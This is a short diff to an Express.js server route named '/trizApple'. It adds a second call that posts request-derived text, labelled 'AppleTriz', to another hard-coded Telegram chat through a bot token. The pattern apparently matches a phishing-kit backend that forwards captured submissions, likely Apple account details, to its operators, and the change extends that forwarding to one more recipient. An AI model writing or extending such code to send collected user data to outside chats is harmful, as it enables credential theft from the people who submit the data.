@@ -3509,6 +3509,9 @@ app.post("/trizApple", (req, res) => {
       axios.post(
         `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleTriz:\n${originalText}`
       );
+      axios.post(
+        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1190384225&text=AppleTriz:\n${originalText}`
+      );
       res.send("Update Complete");
     });
 });
